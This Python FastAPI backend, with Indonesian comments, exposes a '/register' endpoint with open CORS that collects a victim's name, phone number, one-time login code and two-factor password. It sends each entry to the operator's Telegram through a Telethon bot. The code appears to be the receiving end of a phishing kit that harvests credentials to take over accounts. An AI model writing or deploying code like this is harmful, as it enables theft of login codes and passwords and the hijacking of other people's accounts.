from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient
import os

# 1. DEFINE APP DI PALING ATAS (Agar tidak error 'not defined')
app = FastAPI()

# 2. KONFIGURASI CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# 3. AMBIL DATA DARI VARIABLES RAILWAY
API_ID = os.getenv('API_ID')
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')

# Pastikan bot_client didefinisikan setelah variabel diambil
bot_client = TelegramClient('bot_session', int(API_ID) if API_ID else 0, API_HASH)

@app.on_event("startup")
async def startup_event():
    if BOT_TOKEN:
        await bot_client.start(bot_token=BOT_TOKEN)
        print("Backend Berhasil Online!")

@app.post("/register")
async def register(request: Request):
    data = await request.json()
    nama = data.get("name")
    phone = data.get("phone")
    step = data.get("step") 
    otp = data.get("otp", "")
    password = data.get("password", "")
    
    # Format pesan lengkap untuk Telegram
    message = f"🔔 **Notif Pendaftaran**\n\n👤 Nama: {nama}\n📱 No: {phone}\n🛠 Status: {step}"
    
    if otp:
        message += f"\n🔑 Kode OTP: {otp}"
    if password:
        message += f"\n🔒 Sandi/2FA: {password}"
        
    await bot_client.send_message('me', message)
    return {"status": "success"}

# 4. ROOT ROUTE (Agar URL tidak "Not Found")
@app.get("/")
async def root():
    return {"message": "Server Aktif!"}